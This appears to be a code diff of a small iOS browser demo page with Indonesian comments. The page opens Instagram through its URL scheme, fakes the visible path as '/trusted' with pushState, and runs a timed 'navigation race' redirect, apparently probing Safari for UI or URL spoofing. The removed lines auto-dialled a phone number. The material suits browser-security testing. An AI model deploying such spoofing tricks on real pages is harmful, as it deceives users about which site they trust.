@@ -2,66 +2,51 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>iOS All-in-One Demo</title>
+  <title>iOS Open App + Panel + Navigation</title>
   <style>
+    button {
+      margin: 10px;
+      padding: 12px 20px;
+      font-size: 16px;
+    }
     #panel {
       display: none;
       padding: 10px;
       border: 1px solid #ccc;
       margin-top: 10px;
     }
-    button {
-      margin: 5px 0;
-    }
   </style>
 </head>
 <body>
 
-<h2>Demo iOS: Semua Aksi Sekali Klik</h2>
+<h2>Demo iOS: Buka Aplikasi + Panel + Navigation Race</h2>
 
 <button id="allBtn">Lakukan Semua Aksi</button>
-<p id="status"></p>
 <div id="panel">Panel Terbuka!</div>
 
 <script>
 const allBtn = document.getElementById('allBtn');
 const panel = document.getElementById('panel');
-const status = document.getElementById('status');
 
 allBtn.onclick = () => {
-  const phoneNumber = "+6281234567890"; // ganti sesuai nomor
+  // --- Step 1: Buka aplikasi (Instagram) ---
+  window.location = "instagram://app"; // bisa diganti aplikasi lain
 
-  // --- Step 1: Buka Instagram ---
-  status.innerText = "Mencoba membuka Instagram…";
-  const start = Date.now();
-  window.location = "instagram://app";
-
-  // --- Step 2: Delay untuk tel ---
-  setTimeout(() => {
-    status.innerText = `Mencoba menelpon ${phoneNumber}…`;
-    window.location.href = `tel:${phoneNumber}`;
-
-    setTimeout(() => {
-      status.innerText = "Instagram atau panggilan mungkin tidak muncul, pastikan perangkat mendukung.";
-    }, 1000);
-
-  }, 1000);
-
-  // --- Step 3: PushState + tampilkan panel ---
+  // --- Step 2: PushState + tampilkan panel ---
   history.pushState({}, '', '/trusted');
   panel.style.display = 'block';
+};
 
-  // --- Step 4: Navigation race (redirect) ---
-  window.addEventListener('pageshow', () => {
+// --- Step 3: Navigation race (redirect) ---
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
     requestAnimationFrame(() => {
-      requestAnimationFrame(() => {
-        setTimeout(() => {
-          location.href = 'https://google.com:9090';
-        }, 80);
-      });
+      setTimeout(() => {
+        location.href = 'https://google.com:9090';
+      }, 80);
     });
   });
-};
+});
 </script>
 
 </body>
